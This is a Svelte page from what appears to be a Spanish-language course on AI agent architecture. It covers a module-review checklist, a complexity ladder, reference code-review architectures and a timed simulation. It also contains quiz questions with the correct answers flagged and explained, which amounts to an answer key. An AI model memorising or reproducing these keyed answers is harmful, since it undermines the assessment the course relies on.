      sourceUrl: 'https://code.claude.com/docs/en/costs'
    },
    {
      question: 'Estas disenando un sistema de agentes para una tarea nueva. Cual de estas afirmaciones sobre la arquitectura es CORRECTA?',
      options: [
        { text: 'Siempre empezar con multi-agent porque es mas profesional y escalable', correct: false, explanation: 'El "Principio de Anthropic": start with the simplest system that could possibly work. Multi-agent agrega complejidad, costo, y puntos de fallo. Solo justificado cuando un agente unico NO resuelve el problema.' },
        { text: 'Empezar con un prompt bien escrito. Si no basta, escalar a single agent + tools. Si no basta, escalar a multi-agent. Cada nivel solo se justifica cuando el anterior falla.', correct: true, explanation: 'La escalera de complejidad correcta. Cada nivel agrega costo y complejidad: solo subes cuando el nivel actual no resuelve el problema. Corregir typos = prompt. Code review complejo = multi-agent. La habilidad del arquitecto es saber EN QUE NIVEL esta el problema.' },
        { text: 'Usar siempre Claude Opus porque la calidad del modelo es mas importante que el costo', correct: false, explanation: 'Opus es el modelo mas capaz pero no siempre necesario. Linting, formateo, y tareas deterministas funcionan igual de bien con Haiku (300x mas barato). Model routing por complejidad de tarea es lo optimo.' },
        { text: 'Copiar la arquitectura de un caso de exito de Anthropic (ej: el compilador C de 16 agentes) para cualquier proyecto', correct: false, explanation: 'El compilador C tenia 100K lineas de Rust como requisito. Tu proyecto probablemente no. Las arquitecturas de referencia son inspiracion, no plantillas. El contexto (escala, complejidad, presupuesto) define la arquitectura correcta.' }
      ],
      source: 'Anthropic - Building Effective AI Agents',
      sourceUrl: 'https://www.anthropic.com/engineering/building-effective-agents'
    },
    {
      question: 'Un colega propone usar agentes IA para cada uno de estos casos. En cual de ellos un agente es INNECESARIO y un prompt simple (sin agent loop, sin tools) seria la mejor solucion?',
      options: [
        { text: 'Revisar un PR de 500 lineas buscando vulnerabilidades de seguridad y sugerencias de mejora', correct: false, explanation: 'Un PR de 500 lineas requiere leer multiples archivos, entender dependencias, y potencialmente ejecutar tests. Necesita tools (read_file, grep, bash) y multiples iteraciones del agent loop. Un agente es apropiado.' },
        { text: 'Traducir los mensajes de error de una aplicacion del ingles al espanol, dado un archivo JSON con 200 strings', correct: true, explanation: 'Traduccion de strings es una tarea de transformacion pura: input (texto ingles) → output (texto espanol). No requiere herramientas, no requiere multiples pasos, no requiere decisiones sobre que hacer. Un prompt con el JSON y la instruccion "traduce al espanol" resuelve esto en UNA llamada al LLM. Usar un agente seria sobre-ingenieria.' },
        { text: 'Investigar un bug reportado por un usuario, reproducirlo, identificar la causa raiz, y proponer un fix', correct: false, explanation: 'Debugging requiere multiples pasos autonomos: leer el reporte, buscar en el codigo, ejecutar tests, formular hipotesis, verificar. Es un caso clasico de agent loop con tools.' },
        { text: 'Crear un MCP server en Go que se conecte a una base de datos PostgreSQL y exponga 10 herramientas', correct: false, explanation: 'Desarrollo de software requiere leer docs, escribir codigo, ejecutar tests, iterar. Es una tarea multi-paso que se beneficia enormemente del agent loop con tools como Read, Write, Bash.' }
      ],
      source: 'Anthropic - Building Effective AI Agents',
      sourceUrl: 'https://www.anthropic.com/engineering/building-effective-agents'
    }
  ];
</script>

<svelte:head>
  <title>Modulo 13: {mod.title} | Agent Mastery</title>
</svelte:head>

<div class="max-w-4xl mx-auto px-4 py-8">
  <!-- Header -->
  <div class="mb-8 fade-in">
    <div class="flex items-center gap-3 mb-2">
      <span class="text-4xl">{mod.icon}</span>
      <div>
        <p class="text-agent-accent text-sm font-bold uppercase tracking-wider">Modulo {MODULE_ID} — Taller Final</p>
        <h1 class="text-3xl font-bold text-agent-text">{mod.title}</h1>
      </div>
    </div>
    <p class="text-agent-muted mt-2">{mod.subtitle}</p>
    <div class="flex items-center gap-4 mt-3">
      <span class="text-xs text-agent-muted bg-agent-card px-3 py-1 rounded-full border border-agent-border">{mod.duration}</span>
      <span class="text-xs text-agent-muted bg-agent-card px-3 py-1 rounded-full border border-agent-border">{mod.type}</span>
    </div>
  </div>

  <!-- Objectives -->
  <div class="card mb-8 fade-in">
    <h2 class="text-lg font-bold text-agent-text mb-3">Objetivos del modulo</h2>
    <ul class="space-y-2">
      {#each mod.objectives as obj}
        <li class="flex items-start gap-2 text-sm text-agent-muted">
          <span class="text-agent-accent shrink-0 mt-0.5">&#9656;</span>
          {obj}
        </li>
      {/each}
    </ul>
  </div>

  <!-- ============================================================= -->
  <!-- SECTION 1: Revision de los 12 Modulos                          -->
  <!-- ============================================================= -->
  <section class="mb-10 fade-in">
    <h2 class="text-2xl font-bold text-agent-text mb-4">Revision de los 12 Modulos</h2>
    <p class="text-agent-muted leading-relaxed mb-6">
      Antes de enfrentar la simulacion final, repasa los conceptos clave de cada modulo. Cada tarjeta representa un bloque de conocimiento que vas a necesitar para tomar decisiones de arquitectura informadas. Si alguno no te suena claro, es mejor volver al modulo correspondiente antes de continuar.
    </p>

    <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 mb-6">
      {#each moduleReview as m}
        <div class="bg-agent-dark border border-agent-border/50 rounded-lg p-4 hover:border-agent-accent/40 transition-colors duration-200">
          <div class="flex items-center gap-2 mb-2">
            <span class="text-2xl">{m.icon}</span>
            <span class="text-xs text-agent-accent font-bold">M{String(m.id).padStart(2, '0')}</span>
          </div>
          <p class="text-sm font-bold text-agent-text mb-1">{m.label}</p>
          <p class="text-xs text-agent-muted leading-relaxed">{m.concept}</p>
        </div>
      {/each}
    </div>

    <div class="bg-agent-dark border border-agent-accent/20 rounded-lg p-4 mb-6">
      <p class="text-sm text-agent-accent font-bold mb-2">&#127919; Estos 12 bloques forman tu toolkit de Agent Architect</p>
      <p class="text-sm text-agent-muted">
        Cada decision en la simulacion siguiente va a requerir que combines conocimientos de 2-3 modulos simultaneamente. Por ejemplo: elegir el patron de orquestacion (M09) requiere entender cuantos agentes necesitas (M01), que herramientas tiene cada uno (M02), y como gestionar el contexto de cada agente (M04). La arquitectura de agentes es <strong class="text-agent-text">integradora por naturaleza</strong>.
      </p>
    </div>

    <!-- Expanded Checklist with sub-questions -->
    <h3 class="text-lg font-bold text-agent-text mb-3">Checklist de Auto-Evaluacion</h3>
    <p class="text-agent-muted leading-relaxed mb-4">
      Para cada modulo, hazte estas preguntas. Si puedes responderlas con confianza, estas listo para la simulacion. Si alguna te genera duda, vuelve al modulo correspondiente.
    </p>

    <div class="space-y-2 mb-6">
      <div class="flex items-start gap-3 p-3 bg-agent-dark rounded-lg border border-agent-border/50">
        <span class="text-agent-accent text-sm font-bold w-8 shrink-0">M1</span>
        <div>
          <p class="text-sm text-agent-text font-semibold">&#191;Necesito un agente o basta con un prompt?</p>
          <p class="text-xs text-agent-muted mt-1">&#191;La tarea requiere multiples pasos autonomos? &#191;Necesita decidir que herramientas usar? &#191;O es una transformacion simple input&#8594;output que se resuelve en una llamada?</p>
        </div>
      </div>
      <div class="flex items-start gap-3 p-3 bg-agent-dark rounded-lg border border-agent-border/50">
        <span class="text-agent-accent text-sm font-bold w-8 shrink-0">M2</span>
        <div>
          <p class="text-sm text-agent-text font-semibold">&#191;Las herramientas de cada agente estan bien definidas?</p>
          <p class="text-xs text-agent-muted mt-1">&#191;Cada agente tiene 3-5 tools enfocadas en su dominio? &#191;Las descripciones son claras para el LLM? &#191;Hay tools peligrosas que necesitan validacion?</p>
        </div>
      </div>
      <div class="flex items-start gap-3 p-3 bg-agent-dark rounded-lg border border-agent-border/50">
        <span class="text-agent-accent text-sm font-bold w-8 shrink-0">M3</span>
        <div>
          <p class="text-sm text-agent-text font-semibold">&#191;Que modelo y superficie de Claude Code uso?</p>
          <p class="text-xs text-agent-muted mt-1">&#191;CLI, IDE extension, API headless, o Agent SDK? &#191;Necesito Opus para razonamiento complejo o Haiku basta para tareas mecanicas?</p>
        </div>
      </div>
      <div class="flex items-start gap-3 p-3 bg-agent-dark rounded-lg border border-agent-border/50">
        <span class="text-agent-accent text-sm font-bold w-8 shrink-0">M4</span>
        <div>
          <p class="text-sm text-agent-text font-semibold">&#191;El contexto del agente esta bien disenado?</p>
          <p class="text-xs text-agent-muted mt-1">&#191;CLAUDE.md tiene las 6 capas? &#191;Estoy usando just-in-time context con .claude/rules/? &#191;El context window no esta desperdiciando tokens en reglas irrelevantes?</p>
        </div>
      </div>
      <div class="flex items-start gap-3 p-3 bg-agent-dark rounded-lg border border-agent-border/50">
        <span class="text-agent-accent text-sm font-bold w-8 shrink-0">M5</span>
        <div>
          <p class="text-sm text-agent-text font-semibold">&#191;Sigo el workflow de 4 fases?</p>
          <p class="text-xs text-agent-muted mt-1">&#191;Explore antes de actuar? &#191;Plan Mode para verificar? &#191;Evito los 5 patrones de fracaso (prompt vago, no verificar, no usar /clear, etc.)?</p>
        </div>
      </div>
      <div class="flex items-start gap-3 p-3 bg-agent-dark rounded-lg border border-agent-border/50">
        <span class="text-agent-accent text-sm font-bold w-8 shrink-0">M6</span>
        <div>
          <p class="text-sm text-agent-text font-semibold">&#191;La estructura del agente es correcta?</p>
          <p class="text-xs text-agent-muted mt-1">&#191;Tengo el ciclo gather-act-verify-iterate? &#191;Hay condicion de parada? &#191;Max iteraciones definido? &#191;Error handling con retry y fallback?</p>
        </div>
      </div>
      <div class="flex items-start gap-3 p-3 bg-agent-dark rounded-lg border border-agent-border/50">
        <span class="text-agent-accent text-sm font-bold w-8 shrink-0">M7</span>
        <div>
          <p class="text-sm text-agent-text font-semibold">&#191;La memoria y el razonamiento estan configurados?</p>
          <p class="text-xs text-agent-muted mt-1">&#191;Se que tipo de memoria necesita (corto/largo plazo)? &#191;Estoy usando Think Tool para tareas complejas? &#191;Extended thinking esta habilitado donde corresponde?</p>
        </div>
      </div>
      <div class="flex items-start gap-3 p-3 bg-agent-dark rounded-lg border border-agent-border/50">
        <span class="text-agent-accent text-sm font-bold w-8 shrink-0">M8</span>
        <div>
          <p class="text-sm text-agent-text font-semibold">&#191;Los hooks, skills, y permisos estan configurados?</p>
          <p class="text-xs text-agent-muted mt-1">&#191;PreToolUse como guardrail preventivo? &#191;PostToolUse para auditing? &#191;Skills reutilizables creadas? &#191;Sub-agents con aislamiento apropiado?</p>
        </div>
      </div>
      <div class="flex items-start gap-3 p-3 bg-agent-dark rounded-lg border border-agent-border/50">
        <span class="text-agent-accent text-sm font-bold w-8 shrink-0">M9</span>
        <div>
          <p class="text-sm text-agent-text font-semibold">&#191;El patron de orquestacion es el correcto?</p>
          <p class="text-xs text-agent-muted mt-1">&#191;Tareas independientes en paralelo (Orchestrator-Worker)? &#191;Tareas secuenciales en pipeline? &#191;Agent Teams para desarrollo colaborativo? &#191;La escala justifica multi-agent?</p>
        </div>
      </div>
      <div class="flex items-start gap-3 p-3 bg-agent-dark rounded-lg border border-agent-border/50">
        <span class="text-agent-accent text-sm font-bold w-8 shrink-0">M10</span>
        <div>
          <p class="text-sm text-agent-text font-semibold">&#191;Los guardrails y evaluaciones estan definidos?</p>
          <p class="text-xs text-agent-muted mt-1">&#191;Guardrails de input Y output? &#191;Sandbox activado? &#191;Golden dataset para benchmarking? &#191;Pass^k para consistency? &#191;Human spot checks?</p>
        </div>
      </div>
      <div class="flex items-start gap-3 p-3 bg-agent-dark rounded-lg border border-agent-border/50">
        <span class="text-agent-accent text-sm font-bold w-8 shrink-0">M11</span>
        <div>
          <p class="text-sm text-agent-text font-semibold">&#191;El entorno soporta multiples sesiones?</p>
          <p class="text-xs text-agent-muted mt-1">&#191;Git worktrees para aislamiento? &#191;Tmux/zellij para multiples terminales? &#191;Puedo correr 3-5 agentes en paralelo sin interferencia?</p>
        </div>
      </div>
      <div class="flex items-start gap-3 p-3 bg-agent-dark rounded-lg border border-agent-border/50">
        <span class="text-agent-accent text-sm font-bold w-8 shrink-0">M12</span>
        <div>
          <p class="text-sm text-agent-text font-semibold">&#191;El sistema funciona en produccion sin intervencion humana?</p>
          <p class="text-xs text-agent-muted mt-1">&#191;GitHub Action configurada? &#191;Headless mode con --allowedTools? &#191;Harness para tareas largas? &#191;Costos bajo control con model routing y batch API?</p>
        </div>
      </div>
    </div>

    <div class="bg-agent-dark border border-agent-warning/30 rounded-lg p-4">
      <p class="text-sm text-agent-warning font-bold mb-2">&#128161; El profesional "T-shaped"</p>
      <p class="text-sm text-agent-muted">
        Un Agent Architect es <strong class="text-agent-text">"T-shaped"</strong>: conocimiento amplio en los 12 dominios (la barra horizontal) y conocimiento profundo en 2-3 areas especificas (la barra vertical). No necesitas ser experto en TODO, pero si necesitas saber lo suficiente de cada area para tomar decisiones informadas y reconocer cuando necesitas consultar a un especialista.
      </p>
    </div>
  </section>

  <!-- ============================================================= -->
  <!-- SECTION 2: Escalera de Complejidad                              -->
  <!-- ============================================================= -->
  <section class="mb-10 fade-in">
    <h2 class="text-2xl font-bold text-agent-text mb-4">La Escalera de Complejidad</h2>
    <p class="text-agent-muted leading-relaxed mb-6">
      La primera decision de un Agent Architect no es "cuantos agentes uso", sino "necesito un agente?". La escalera de complejidad muestra los 5 niveles de sofisticacion. La regla de oro: <strong class="text-agent-text">nunca subas un escalon a menos que el nivel actual no resuelva el problema</strong>.
    </p>

    <div class="space-y-3 mb-6">
      {#each complexityLadder as step}
        <div class="flex items-start gap-4 bg-agent-dark border {step.border} rounded-lg p-4">
          <div class="shrink-0 w-12 h-12 rounded-full bg-agent-card border border-agent-border flex items-center justify-center">
            <span class="text-lg font-bold {step.color}">{step.level}</span>
          </div>
          <div class="flex-1">
            <p class="font-bold {step.color} mb-1">{step.name}</p>
            <p class="text-sm text-agent-muted mb-2">{step.desc}</p>
            <p class="text-xs text-agent-muted/70 italic">Ejemplo: {step.example}</p>
          </div>
        </div>
      {/each}
    </div>

    <div class="bg-agent-dark border border-agent-warning/30 rounded-lg p-4 mb-6">
      <p class="text-sm text-agent-warning font-bold mb-2">&#128161; Principio de Anthropic: "Start with the simplest solution"</p>
      <p class="text-sm text-agent-muted">
        El equipo que diseno Claude Agent SDK recomienda siempre empezar en el nivel mas bajo posible. Cada nivel agrega: latencia de coordinacion, costo de tokens, complejidad de debugging, y puntos de fallo. La habilidad real de un arquitecto es saber <strong class="text-agent-text">en que nivel esta el problema</strong>, no demostrar que puede construir el nivel mas alto.
      </p>
    </div>

    <div class="bg-agent-dark border border-agent-danger/20 rounded-lg p-4 mb-6">
      <p class="text-sm text-agent-danger font-bold mb-2">&#9888; Error clasico: "mas agentes = mejor"</p>
      <p class="text-sm text-agent-muted">
        Corregir typos en documentacion? Nivel 1 (un prompt). Hacer code review de un PR complejo con seguridad, calidad, y tests? Nivel 4 (multi-agent orquestado). La diferencia de costo entre ambos enfoques es <strong class="text-agent-text">40x</strong>. Usar nivel 4 para una tarea de nivel 1 no es profesional, es desperdicio.
      </p>
    </div>

    <!-- Practical comparison table -->
    <h3 class="text-lg font-bold text-agent-text mb-3">Comparacion practica: la misma tarea, 3 niveles</h3>
    <p class="text-agent-muted leading-relaxed mb-4">
      Imagina que quieres automatizar la correccion de typos en documentacion. Mira como el nivel de complejidad afecta costo, latencia, y valor:
    </p>

    <div class="space-y-3 mb-6">
      <div class="bg-agent-dark border border-agent-success/30 rounded-lg p-4">
        <p class="text-sm text-agent-success font-bold mb-1">Nivel 1: Prompt Engineering (correcto para esta tarea)</p>
        <p class="text-xs text-agent-muted mb-2">Un prompt que recibe el texto y devuelve correcciones. Sin agente, sin tools. Costo: ~$0.01/doc, Latencia: 2s.</p>
        {@html `<pre class="text-xs bg-agent-darker p-3 rounded mt-2 overflow-x-auto text-agent-muted">response = llm.complete("Corrige typos: " + text)
# 1 llamada, 1 respuesta, terminado</pre>`}
      </div>
      <div class="bg-agent-dark border border-agent-warning/30 rounded-lg p-4">
        <p class="text-sm text-agent-warning font-bold mb-1">Nivel 2: Single Agent (sobre-ingenieria leve)</p>
        <p class="text-xs text-agent-muted mb-2">Agente con diccionario, detector de idioma, formateador. Costo: ~$0.05/doc, Latencia: 15s.</p>
        {@html `<pre class="text-xs bg-agent-darker p-3 rounded mt-2 overflow-x-auto text-agent-muted">agent = Agent(tools=[dictionary, lang_detect, formatter])
# 3-5 iteraciones para lo que se resuelve en 1 llamada</pre>`}
      </div>
      <div class="bg-agent-dark border border-agent-danger/30 rounded-lg p-4">
        <p class="text-sm text-agent-danger font-bold mb-1">Nivel 4: Multi-Agent (locura para typos)</p>
        <p class="text-xs text-agent-muted mb-2">Detector + corrector + validador + orquestador. Costo: ~$0.40/doc, Latencia: 45s.</p>
        {@html `<pre class="text-xs bg-agent-darker p-3 rounded mt-2 overflow-x-auto text-agent-muted"># 4 agentes, 4x costo, 20x latencia. Para typos.
# No hagas esto.</pre>`}
      </div>
    </div>
  </section>

  <!-- ============================================================= -->
  <!-- SECTION 2.5: Arquitecturas de Referencia                        -->
  <!-- ============================================================= -->
  <section class="mb-10 fade-in">
    <h2 class="text-2xl font-bold text-agent-text mb-4">Arquitecturas de Referencia</h2>
    <p class="text-agent-muted leading-relaxed mb-6">
      Antes de la simulacion, estudia estas 3 arquitecturas reales. Van de simple a compleja, y cada una es <strong class="text-agent-text">la correcta para su contexto</strong>. La clave no es cual es "mejor", sino cual es apropiada para el nivel de complejidad del problema.
    </p>

    <!-- Architecture 1: Simple -->
    <div class="card mb-4 border-agent-success/30">
      <div class="flex items-center gap-2 mb-3">
        <span class="text-2xl">&#127793;</span>
        <h3 class="text-lg font-bold text-agent-success">Simple: 1 Agente, 10-20 PRs/dia</h3>
      </div>
      <p class="text-sm text-agent-muted mb-3">
        <strong class="text-agent-text">Contexto:</strong> Startup, 10 developers, presupuesto limitado. Solo feedback basico de calidad.
      </p>
      <div class="grid grid-cols-2 md:grid-cols-4 gap-2 text-xs">
        <div class="bg-agent-dark rounded p-2">
          <p class="text-agent-success font-bold">Agentes</p>
          <p class="text-agent-muted">1 (Sonnet)</p>
        </div>
        <div class="bg-agent-dark rounded p-2">
          <p class="text-agent-success font-bold">Tools</p>
          <p class="text-agent-muted">3 (read, list, comment)</p>
        </div>
        <div class="bg-agent-dark rounded p-2">
          <p class="text-agent-success font-bold">Costo</p>
          <p class="text-agent-muted">~$60/mes</p>
        </div>
        <div class="bg-agent-dark rounded p-2">
          <p class="text-agent-success font-bold">Patron</p>
          <p class="text-agent-muted">Ninguno (single agent)</p>
        </div>
      </div>
    </div>

    <!-- Architecture 2: Medium -->
    <div class="card mb-4 border-agent-warning/30">
      <div class="flex items-center gap-2 mb-3">
        <span class="text-2xl">&#127795;</span>
        <h3 class="text-lg font-bold text-agent-warning">Media: 5 Agentes, 80-100 PRs/dia</h3>
      </div>
      <p class="text-sm text-agent-muted mb-3">
        <strong class="text-agent-text">Contexto:</strong> Empresa mediana, 50 developers, compliance SOC2. Calidad + seguridad + tests.
      </p>
      <div class="grid grid-cols-2 md:grid-cols-4 gap-2 text-xs">
        <div class="bg-agent-dark rounded p-2">
          <p class="text-agent-warning font-bold">Agentes</p>
          <p class="text-agent-muted">4 + 1 orquestador</p>
        </div>
        <div class="bg-agent-dark rounded p-2">
          <p class="text-agent-warning font-bold">Tools</p>
          <p class="text-agent-muted">3-4 por agente</p>
        </div>
        <div class="bg-agent-dark rounded p-2">
          <p class="text-agent-warning font-bold">Costo</p>
          <p class="text-agent-muted">~$240/mes</p>
        </div>
        <div class="bg-agent-dark rounded p-2">
          <p class="text-agent-warning font-bold">Patron</p>
          <p class="text-agent-muted">Orchestrator-Worker</p>
        </div>
      </div>
      {@html `<pre class="text-xs bg-agent-darker p-3 rounded mt-3 overflow-x-auto text-agent-muted"># Flujo: PR → Orchestrator
#   ├→ Quality (Haiku)    ──┐
#   ├→ Security (Sonnet)  ──┼→ Summary (Sonnet) → Post
#   └→ Tests (Sonnet)     ──┘</pre>`}
    </div>

    <!-- Architecture 3: Complex -->
    <div class="card mb-6 border-agent-accent/30">
      <div class="flex items-center gap-2 mb-3">
        <span class="text-2xl">&#127795;&#127795;</span>
        <h3 class="text-lg font-bold text-agent-accent">Compleja: 10+ Agentes, 200+ PRs/dia</h3>
      </div>
      <p class="text-sm text-agent-muted mb-3">
        <strong class="text-agent-text">Contexto:</strong> Enterprise, 200 developers, HIPAA/SOC2. Review + auto-fix + docs + tests.
      </p>
      <div class="grid grid-cols-2 md:grid-cols-4 gap-2 text-xs">
        <div class="bg-agent-dark rounded p-2">
          <p class="text-agent-accent font-bold">Agentes</p>
          <p class="text-agent-muted">10+ especializados</p>
        </div>
        <div class="bg-agent-dark rounded p-2">
          <p class="text-agent-accent font-bold">Tools</p>
          <p class="text-agent-muted">30+ total</p>
        </div>
        <div class="bg-agent-dark rounded p-2">
          <p class="text-agent-accent font-bold">Costo</p>
          <p class="text-agent-muted">$1,500-3,000/mes</p>
        </div>
        <div class="bg-agent-dark rounded p-2">
          <p class="text-agent-accent font-bold">Patron</p>
          <p class="text-agent-muted">Hierarchical + Agent Teams</p>
        </div>
      </div>
    </div>

    <!-- Comparison table -->
    <div class="overflow-x-auto mb-6">
      <table class="w-full text-xs border-collapse">
        <thead>
          <tr class="border-b border-agent-border">
            <th class="text-left p-2 text-agent-muted">Criterio</th>
            <th class="text-center p-2 text-agent-success">Simple</th>
            <th class="text-center p-2 text-agent-warning">Media</th>
            <th class="text-center p-2 text-agent-accent">Compleja</th>
          </tr>
        </thead>
        <tbody class="text-agent-muted">
          <tr class="border-b border-agent-border/30"><td class="p-2">PRs/dia</td><td class="text-center p-2">10-20</td><td class="text-center p-2">80-100</td><td class="text-center p-2">200+</td></tr>
          <tr class="border-b border-agent-border/30"><td class="p-2">Latencia/PR</td><td class="text-center p-2">1-2 min</td><td class="text-center p-2">2-3 min</td><td class="text-center p-2">3-5 min</td></tr>
          <tr class="border-b border-agent-border/30"><td class="p-2">Costo/mes</td><td class="text-center p-2">$60</td><td class="text-center p-2">$240</td><td class="text-center p-2">$1,500+</td></tr>
          <tr class="border-b border-agent-border/30"><td class="p-2">Seguridad</td><td class="text-center p-2">Basica</td><td class="text-center p-2">OWASP + deps</td><td class="text-center p-2">Full compliance</td></tr>
          <tr class="border-b border-agent-border/30"><td class="p-2">Hooks</td><td class="text-center p-2">Ninguno</td><td class="text-center p-2">Pre + Post</td><td class="text-center p-2">4 capas</td></tr>
          <tr class="border-b border-agent-border/30"><td class="p-2">Evals</td><td class="text-center p-2">Manual</td><td class="text-center p-2">Golden dataset</td><td class="text-center p-2">pass^k + A/B</td></tr>
          <tr><td class="p-2">Complejidad</td><td class="text-center p-2">Baja</td><td class="text-center p-2">Media</td><td class="text-center p-2">Alta</td></tr>
        </tbody>
      </table>
    </div>

    <div class="bg-agent-dark border border-agent-info/20 rounded-lg p-4">
      <p class="text-sm text-agent-info font-bold mb-2">&#128218; Caso real: GitHub Copilot Code Review</p>
      <p class="text-sm text-agent-muted">
        GitHub lanzo su sistema de code review con IA en 2025. Empezo como un agente simple (Nivel 2) que hacia comentarios basicos. A medida que validaron con metricas de satisfaccion de developers, lo escalaron a un sistema multi-agente con especializacion por dominio. <strong class="text-agent-text">Empezaron simple, escalaron con datos.</strong> Es exactamente la escalera de complejidad en accion.
      </p>
    </div>
  </section>

  <!-- ============================================================= -->
  <!-- SECTION 3: Preparacion para la Simulacion                       -->
  <!-- ============================================================= -->
  <section class="mb-10 fade-in">
    <h2 class="text-2xl font-bold text-agent-text mb-4">Preparacion para la Simulacion</h2>
    <p class="text-agent-muted leading-relaxed mb-4">
      La simulacion siguiente te pone en el rol de <strong class="text-agent-text">Agent Architect de TechCorp</strong>. Vas a disenar un sistema de code review basado en Claude Code para una empresa con 200 PRs/dia. Cada decision tiene puntos segun la calidad del razonamiento, no segun una respuesta "correcta" unica.
    </p>

    <div class="bg-agent-dark border border-agent-accent/30 rounded-lg p-5 mb-6">
      <p class="text-sm text-agent-accent font-bold mb-3">&#127919; Criterios de evaluacion</p>
      <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
        <div class="flex items-start gap-2">
          <span class="text-agent-accent text-sm shrink-0">1.</span>
          <div>
            <p class="text-sm font-bold text-agent-text">Simplicidad</p>
            <p class="text-xs text-agent-muted">La solucion mas simple que funcione. No sobre-ingeniar.</p>
          </div>
        </div>
        <div class="flex items-start gap-2">
          <span class="text-agent-accent text-sm shrink-0">2.</span>
          <div>
            <p class="text-sm font-bold text-agent-text">Patron correcto</p>
            <p class="text-xs text-agent-muted">Orchestrator-Worker vs Pipeline vs Handoff segun el caso.</p>
          </div>
        </div>
        <div class="flex items-start gap-2">
          <span class="text-agent-accent text-sm shrink-0">3.</span>
          <div>
            <p class="text-sm font-bold text-agent-text">Guardrails multicapa</p>
            <p class="text-xs text-agent-muted">Permisos + hooks + budgets + escalacion humana.</p>
          </div>
        </div>
        <div class="flex items-start gap-2">
          <span class="text-agent-accent text-sm shrink-0">4.</span>
          <div>
            <p class="text-sm font-bold text-agent-text">Observabilidad</p>
            <p class="text-xs text-agent-muted">Metricas tecnicas + metricas de negocio + traces.</p>
          </div>
        </div>
        <div class="flex items-start gap-2">
          <span class="text-agent-accent text-sm shrink-0">5.</span>
          <div>
            <p class="text-sm font-bold text-agent-text">Costos</p>
            <p class="text-xs text-agent-muted">Model routing, batch API, token budgets.</p>
          </div>
        </div>
        <div class="flex items-start gap-2">
          <span class="text-agent-accent text-sm shrink-0">6.</span>
          <div>
            <p class="text-sm font-bold text-agent-text">Resiliencia</p>
            <p class="text-xs text-agent-muted">Fallback chains, degradacion graceful, escalacion.</p>
          </div>
        </div>
      </div>
    </div>

    <div class="bg-agent-card border border-agent-warning/30 rounded-lg p-4 mb-6">
      <p class="text-sm text-agent-warning font-bold mb-2">&#9202; Tienes 15 minutos</p>
      <p class="text-sm text-agent-muted">
        El timer comienza cuando inicias la simulacion. Si el tiempo se agota, la simulacion se completa con tu puntuacion actual <strong class="text-agent-text">menos 3 puntos de penalizacion</strong>. Un arquitecto real trabaja bajo presion de tiempo: esta restriccion simula esa realidad. Lee bien cada escenario, pero no te paralices analizando.
      </p>
    </div>

    {#if !showScenario}
      <div class="text-center">
        <button
          onclick={() => { showScenario = true; }}
          class="btn-primary text-lg px-8 py-3"
        >
          Iniciar Simulacion &#8594;
        </button>
        <p class="text-xs text-agent-muted mt-2">El timer de 15 minutos comenzara automaticamente</p>
      </div>
    {/if}
  </section>

  <!-- ============================================================= -->
  <!-- SECTION 4: Timer + BranchingScenario                            -->
  <!-- ============================================================= -->
  {#if showScenario}
    <section class="mb-10 fade-in">
      <div class="mb-4">
        <Timer
          duration={900}
          onTimeUp={handleTimeUp}
          autoStart={true}
          label="Tiempo restante"
        />
      </div>

      {#if timedOut && !scenarioDone}
        <div class="bg-agent-danger/10 border border-agent-danger/30 rounded-lg p-4 mb-4">
          <p class="text-sm text-agent-danger font-bold">&#9202; Tiempo agotado</p>
          <p class="text-sm text-agent-muted">El timer ha expirado. Completa el escenario con tu puntuacion actual. Se aplicara una penalizacion de -3 puntos.</p>
        </div>
      {/if}

      <BranchingScenario
        nodes={scenarioNodes}
        startId="start"
        title="Simulacion: Disena el Sistema de Code Review de TechCorp"
        onComplete={handleScenarioComplete}
      />
    </section>
  {/if}

  <!-- ============================================================= -->
  <!-- SECTION 5: Quiz de Sintesis                                     -->
  <!-- ============================================================= -->
  <section class="mb-10 fade-in">
    <h2 class="text-2xl font-bold text-agent-text mb-4">Quiz de Sintesis Final</h2>
    <p class="text-agent-muted leading-relaxed mb-6">
      5 preguntas que requieren combinar conocimientos de multiples modulos. No son preguntas de memoria: son preguntas de <strong class="text-agent-text">razonamiento arquitectonico</strong>. Cada pregunta tiene una respuesta optima basada en los principios que estudiaste.
    </p>

    <Quiz
      questions={quizQuestions}
      onComplete={handleQuizComplete}
    />
  </section>

  <!-- ============================================================= -->
  <!-- SECTION 6: Completion Message                                   -->
  <!-- ============================================================= -->
  {#if completed}
    <section class="mb-10 fade-in">
      <div class="card border-agent-accent/30 text-center py-8">
        <span class="text-5xl">&#127942;</span>
        <h2 class="text-2xl font-bold text-agent-text mt-4">Taller Final Completado</h2>
        <p class="text-agent-muted mt-2 mb-4">
          Has demostrado tu capacidad para disenar sistemas de agentes bajo presion.
        </p>

        <div class="grid grid-cols-1 sm:grid-cols-2 gap-4 max-w-md mx-auto mb-6">
          <div class="bg-agent-dark rounded-lg p-4">
            <p class="text-xs text-agent-muted mb-1">Simulacion</p>
            <p class="text-xl font-bold text-agent-accent">{scenarioScore}/{scenarioMax}</p>
            {#if timedOut}
              <p class="text-xs text-agent-danger">(-3 por tiempo)</p>
            {/if}
          </div>
          <div class="bg-agent-dark rounded-lg p-4">
            <p class="text-xs text-agent-muted mb-1">Quiz</p>
            <p class="text-xl font-bold text-agent-accent">{quizScore}/{quizMax}</p>
          </div>
        </div>

        <div class="bg-agent-dark rounded-lg p-4 max-w-md mx-auto mb-6">
          <p class="text-xs text-agent-muted mb-1">Puntuacion Total</p>
          <p class="text-2xl font-bold text-agent-accent">{scenarioScore + quizScore}/{scenarioMax + quizMax}</p>
          <p class="text-sm text-agent-muted mt-1">
            {#if (scenarioScore + quizScore) >= (scenarioMax + quizMax) * 0.85}
              Nivel: Arquitecto Senior
            {:else if (scenarioScore + quizScore) >= (scenarioMax + quizMax) * 0.65}
              Nivel: Arquitecto Junior
            {:else if (scenarioScore + quizScore) >= (scenarioMax + quizMax) * 0.4}
              Nivel: En Entrenamiento
            {:else}
              Nivel: Revisar Fundamentos
            {/if}
          </p>
        </div>

        <div class="bg-agent-dark border border-agent-accent/20 rounded-lg p-5 text-left max-w-lg mx-auto mb-6">
          <h3 class="text-lg font-bold text-agent-text mb-3">De Usuario a Arquitecto</h3>
          <p class="text-sm text-agent-muted leading-relaxed mb-3">
            Has recorrido el camino completo: desde entender que es un agente (Modulo 1) hasta disenar sistemas multi-agente para produccion (Modulo 13). La diferencia entre un usuario y un arquitecto no es lo que sabes, es <strong class="text-agent-text">como razonas sobre tradeoffs</strong>.
          </p>
